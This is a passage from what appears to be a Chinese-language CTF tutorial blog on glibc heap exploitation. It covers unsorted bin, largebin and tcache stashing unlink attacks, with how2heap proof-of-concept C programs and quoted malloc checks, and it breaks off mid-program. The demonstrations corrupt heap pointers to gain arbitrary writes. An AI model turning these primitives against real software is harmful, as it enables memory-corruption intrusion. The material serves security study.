<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates unsorted bin attack by write a large &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsigned long value into stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">      <span class="built_in">stderr</span>,</span><br><span class="line">      <span class="string">&quot;In practice, unsorted bin attack is generally prepared for further &quot;</span></span><br><span class="line">      <span class="string">&quot;attacks, such as rewriting the &quot;</span></span><br><span class="line">      <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> target_var = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">          <span class="string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %ld\n\n&quot;</span>, &amp;target_var, target_var);</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> *p = <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate first normal chunk on the heap at: %p\n&quot;</span>,</span><br><span class="line">          p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another normal chunk in order to avoid &quot;</span></span><br><span class="line">                  <span class="string">&quot;consolidating the top chunk with&quot;</span></span><br><span class="line">                  <span class="string">&quot;the first one during the free()\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first chunk now and it will be inserted in the &quot;</span></span><br><span class="line">                  <span class="string">&quot;unsorted bin with its bk pointer &quot;</span></span><br><span class="line">                  <span class="string">&quot;point to %p\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*------------VULNERABILITY-----------*/</span></span><br><span class="line"></span><br><span class="line">  p[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;target_var - <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the &quot;</span></span><br><span class="line">                  <span class="string">&quot;victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And we write it with the target address-16 (in 32-bits &quot;</span></span><br><span class="line">                  <span class="string">&quot;machine, it should be target address-8):%p\n\n&quot;</span>,</span><br><span class="line">          (<span class="type">void</span> *)p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again to get the chunk we just free. During &quot;</span></span><br><span class="line">                  <span class="string">&quot;this time, target should has already been &quot;</span></span><br><span class="line">                  <span class="string">&quot;rewrite:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%p: %p\n&quot;</span>, &amp;target_var, (<span class="type">void</span> *)target_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ctf-wiki 已对其作出详细分析，鄙人不在此赘述，具体请看<a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/#unsorted-bin-attack_1" >Unsorted Bin Attack - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>glibc-2.29的检查部分如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line">        mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">            || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">            || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">          malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>显然，它会检查很多条件，利用起来基本不可能。</p>
<h2 id="Largebin-attack"><a href="#Largebin-attack" class="headerlink" title="Largebin attack"></a>Largebin attack</h2><p>参考文章：[<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_11" >原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/large-bin-attack/" >Large Bin Attack - CTF Wiki (ctf-wiki.org) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="libc-2-29及以前"><a href="#libc-2-29及以前" class="headerlink" title="libc-2.29及以前"></a>libc-2.29及以前</h3><p><strong>攻击流程：</strong>向largebin中放入一个chunkA，修改其bk位为<code>target1-0x10</code>，bk_nextsize位为<code>target2-0x20</code>，此时再向largebin中加入一个大小<strong>略小于chunkA</strong>的chunkB。执行如下代码（victim即chunkB，fwd即chunkA）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line">[...]</span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>经过这些代码，赋值操作为<code>chunkA-&gt;bk_nextsize-&gt;fd_nextsize = chunkB</code>和<code>chunkA-&gt;bk-&gt;fd = chunkB</code>。因此target1和target2均会被赋值为chunkB的地址，即赋值为大数。</p>
<p>how2heap给出的POC（在没有tcache的版本中实验）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">                    <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">                    <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">                    <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">                    <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">                    <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,</span><br><span class="line">            (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">                    <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">                    <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">                    <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">                    <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="libc-2-30以后"><a href="#libc-2-30以后" class="headerlink" title="libc-2.30以后"></a>libc-2.30以后</h3><p>在libc-2.30中加入了一些检查，封堵了常规largebin attack的方法。</p>
<p>当向largebin中<strong>加入的chunkB略大于chunkA</strong>时，存在检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>基本已经不可利用</p>
<p>而向largebin中<strong>加入的chunkB略小于chunkA</strong>时，仍然可以利用，分支代码逻辑为：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; <span class="comment">// 1</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在执行该代码时，victim为chunkB，largebin中仅有chunkA一个堆块，我们可以通过某些漏洞修改chunkA的数据段为<code>p64(0)*3+p64(target-0x20)</code>。此时fwd和bck均为largebin_list头部，而<code>bck/fwd-&gt;bk/fd</code>就指向chunkA。结合1，2，就有如下赋值操作<code>chunkA-&gt;bk_nextsize-&gt;fd_nextsize = chunkB</code>。即此时target会被赋值为chunkB的地址</p>
<p>如果后续需要接着从largebin中申请的话，就需要还原这些指针了。注意到<code>chunkB-&gt;bk_nextsize = target-0x20</code>，因此当我们从largebin中申请出chunkB时，由于如下代码，target位置会被写入chunkA的地址：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br></pre></td></tr></table></figure></div>

<p>再尝试通过UAF等漏洞修复chunkA的指针，即可再次取出chunkA进行接下来的漏洞利用</p>
<h2 id="Tcache-stashing-unlink-attack"><a href="#Tcache-stashing-unlink-attack" class="headerlink" title="Tcache_stashing_unlink_attack"></a>Tcache_stashing_unlink_attack</h2><p>参考文章：<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4" >https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>顾名思义，这个攻击方式和tcache的<code>tcache stash</code>机制联系紧密，使用范围为libc-2.29+</p>
<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ul>
<li>程序可越过tcache取堆块，即使用calloc取堆块</li>
<li>可泄露堆地址（需要泄露fd，能还原fd，攻击才能正常实施）</li>
<li>可申请大堆块</li>
<li>可修改到chunk的bk位</li>
</ul>
<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p>可在任意位置写入一个libc值</p>
<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>攻击方法：先向tcache中填入堆块，不能填满。然后向smallbin中加入与tcache中堆块大小一致的两个堆块（设先加入的为A，后加入的为B），修改后B堆块的bk位为 <strong>目标位置-0x10</strong>，然后从smallbin中申请堆块，A会被申请出去（脱链时会进行双向完整性检查，因此不能修改B的fd位<code>（bck-&gt;fd = victim &amp;&amp; fwd-&gt;bk = victim）</code>），之后由于tcache stash机制，执行如下代码，完成写入</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;					<span class="comment">//此时bk+0x10位置被写入bin</span></span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="简单POC"><a href="#简单POC" class="headerlink" title="简单POC"></a>简单POC</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)		<span class="comment">//填入tcache</span></span><br><span class="line">		<span class="built_in">free</span>(<span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x60</span>));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The 0x70-tcache has 6 chunks!\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x500</span>);		<span 